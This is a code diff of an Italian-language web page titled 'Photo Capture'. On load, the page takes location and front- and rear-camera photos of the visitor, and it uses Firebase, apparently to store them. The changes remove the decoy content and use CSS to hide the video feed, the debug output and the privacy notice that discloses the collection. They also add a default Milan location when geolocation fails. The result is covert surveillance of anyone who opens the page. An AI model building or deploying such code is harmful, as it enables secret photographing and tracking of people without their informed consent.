@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contenuto Casuale</title>
+    <title>Photo Capture</title>
     <!-- Includi Firebase (versione modulare) -->
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js';
@@ -38,23 +38,35 @@
         window.addDoc = addDocFunc;
     </script>
     <style>
-        #video {
-            max-width: 100%;
-            border: 1px solid #ccc;
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            overflow: hidden;
         }
-        #debug {
-            color: blue;
-            font-size: 14px;
+        #video {
+            display: none; /* Nascondi il video durante la cattura */
+        }
+        #content, #privacy-notice, #debug {
+            display: none; /* Nascondi tutto il testo */
+        }
+        #tempImage {
+            max-width: 100%;
+            max-height: 100vh;
         }
     </style>
 </head>
 <body>
-    <h1>Benvenuto!</h1>
     <div id="content"></div>
     <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
     <div id="debug"></div>
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
+    <img id="tempImage" style="display: none;">
 
     <script>
         // Funzione di debug
@@ -67,34 +79,6 @@
             }
         }
         logDebug("Script avviato");
-
-        // Contenuti casuali
-        const randomContents = [
-            '<img src="https://picsum.photos/600/400?random=1" alt="Immagine casuale 1" style="max-width: 100%;">',
-            '<img src="https://picsum.photos/600/400?random=2" alt="Immagine casuale 2" style="max-width: 100%;">',
-            '<p>😉 Guiñadle! Ecco una sorpresa!</p>',
-            '<p>🌟 Wow, guarda che bello!</p>',
-            '<img src="https://picsum.photos/600/400?random=3" alt="Immagine casuale 3" style="max-width: 100%;">'
-        ];
-
-        // Mostra contenuto casuale
-        function showRandomContent() {
-            const contentDiv = document.getElementById('content');
-            if (contentDiv) {
-                const randomIndex = Math.floor(Math.random() * randomContents.length);
-                contentDiv.innerHTML = randomContents[randomIndex];
-                logDebug("Contenuto casuale mostrato: " + randomContents[randomIndex].substring(0, 20) + "...");
-                if (randomContents[randomIndex].startsWith('<img')) {
-                    const img = contentDiv.querySelector('img');
-                    if (img) {
-                        img.onload = () => logDebug("Immagine caricata con successo");
-                        img.onerror = () => logDebug("Errore nel caricamento dell'immagine");
-                    }
-                }
-            } else {
-                logDebug("Content div non trovato");
-            }
-        }
 
         // Ottieni posizione
         function getLocation() {
@@ -156,20 +140,21 @@
         function takePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
+            const tempImage = document.getElementById('tempImage');
             if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#ffffff'; // Sfondo bianco
+                ctx.fillStyle = '#ffffff';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.9); // Qualità aumentata
+                const photo = canvas.toDataURL('image/jpeg', 0.9);
                 logDebug("Foto scattata, dimensione: " + photo.length + " caratteri");
-                const tempImg = document.createElement('img');
-                tempImg.src = photo;
-                tempImg.style.maxWidth = '100%';
-                document.body.appendChild(tempImg);
-                setTimeout(() => document.body.removeChild(tempImg), 3000);
+                tempImage.src = photo;
+                tempImage.style.display = 'block';
+                setTimeout(() => {
+                    tempImage.style.display = 'none';
+                }, 3000);
                 return photo;
             } else {
                 logDebug("Video o canvas non valido o dimensioni zero");
@@ -210,10 +195,15 @@
         // Funzione principale
         async function captureData() {
             try {
-                showRandomContent();
-                const location = await getLocation();
+                let location;
+                try {
+                    location = await getLocation();
+                } catch (err) {
+                    logDebug("Geolocalizzazione fallita, usando coordinate predefinite: " + err.message);
+                    location = { latitude: 45.4642, longitude: 9.1900 }; // Milano come fallback
+                }
                 let stream = await startCamera('user');
-                await new Promise(resolve => setTimeout(resolve, 2500)); // Ritardo di 2,5 secondi
+                await new Promise(resolve => setTimeout(resolve, 2500));
                 const frontPhoto = takePhoto();
                 stopCamera(stream);
                 stream = await startCamera('environment');
